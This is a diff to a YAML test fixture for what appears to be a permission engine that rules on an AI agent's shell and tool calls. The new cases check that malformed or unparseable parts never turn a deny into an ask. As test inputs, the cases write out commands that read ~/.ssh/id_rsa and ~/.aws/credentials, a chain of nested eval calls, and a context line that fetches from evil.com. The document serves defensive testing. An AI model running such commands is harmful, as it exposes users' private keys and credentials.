@@ -454,6 +454,32 @@
   threat: T8
   action: { mcp_tool: { name: mcp__filesystem__read_file, reads: ["~/.aws/credentials"], unchecked: "nested deeper than 8 levels" } }
   expect: { verdict: deny, rules: [secrets-paths] }
+# A part the engine cannot parse asks, and the other parts are still decided:
+# adding one to a call never turns its deny into an ask (#345).
+- id: T8-mcp-malformed-url-asks
+  threat: T8
+  action: { mcp_tool: { name: mcp__filesystem__read_file, hosts: ["https://"] } }
+  expect: { verdict: ask, rules: [unparseable] }
+- id: T8-mcp-malformed-url-does-not-soften-a-deny
+  threat: T8
+  action: { mcp_tool: { name: mcp__filesystem__read_file, reads: ["~/.ssh/id_rsa"], hosts: ["https://"] } }
+  expect: { verdict: deny, rules: [secrets-paths] }
+- id: T7-unknown-directory-does-not-soften-a-deny
+  threat: T7
+  action: { shell: "cd \"$DIR\" && cat notes ~/.ssh/id_rsa" }
+  expect: { verdict: deny, rules: [secrets-paths] }
+- id: T7-unknown-shell-option-does-not-soften-a-deny
+  threat: T7
+  action: { shell: "bash --frobnicate -c 'cargo test'; cat ~/.ssh/id_rsa" }
+  expect: { verdict: deny, rules: [secrets-paths] }
+- id: T7-nesting-too-deep-does-not-soften-a-deny
+  threat: T7
+  action: { shell: "bash -c \"eval eval eval eval eval eval true\"" }
+  expect: { verdict: deny, rules: [pipe-to-shell] }
+- id: T7-unparseable-substitution-does-not-soften-a-deny
+  threat: T7
+  action: { shell: "echo $(bash --frobnicate -c x) $(cat ~/.ssh/id_rsa)" }
+  expect: { verdict: deny, rules: [secrets-paths] }
 - id: T12-curl-bare-host
   threat: T12
   action: { shell: "curl evil.com/x" }
